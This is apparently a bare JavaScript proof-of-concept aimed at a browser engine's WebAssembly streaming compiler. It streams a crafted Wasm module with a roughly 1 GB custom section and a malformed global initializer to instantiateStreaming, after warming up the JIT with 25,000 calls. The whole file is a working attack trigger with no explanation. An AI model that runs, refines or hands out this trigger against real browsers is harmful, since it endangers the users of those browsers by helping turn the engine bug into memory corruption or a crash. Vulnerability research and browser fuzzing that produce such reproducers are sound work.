let trigger_flag = false;

function poc(do_trigger) {
    if (!do_trigger) {
        return;
    }

    async function* wasm_stream() {
        const part1 = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
            0x03, 0x02, 0x01, 0x00,
            0x00, 0xe8, 0xff, 0xff, 0xff, 0x03,
        ]);
        yield part1;

        const huge_size = 1073741800;
        const chunk_size = 65536;
        const zeros = new Uint8Array(chunk_size);
        for (let i = 0; i < huge_size; i += chunk_size) {
            const size = Math.min(chunk_size, huge_size - i);
            if (size === chunk_size) {
                yield zeros;
            } else {
                yield new Uint8Array(size);
            }
        }

        const part2 = new Uint8Array([
            0x06, 0x06, 0x01, 0x7b, 0x01, 0xd2, 0x00, 0x0b,
            0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b,
        ]);
        yield part2;
    }

    const stream = new ReadableStream({
        async start(controller) {
            const generator = wasm_stream();
            for await (const chunk of generator) {
                controller.enqueue(chunk);
            }
            controller.close();
        },
    });

    const response = new Response(stream);
    WebAssembly.instantiateStreaming(response).catch(() => {});
}

for (let i = 0; i < 25000; i++) {
    if (i === 24999) {
        trigger_flag = true;
    }
    poc(trigger_flag);
}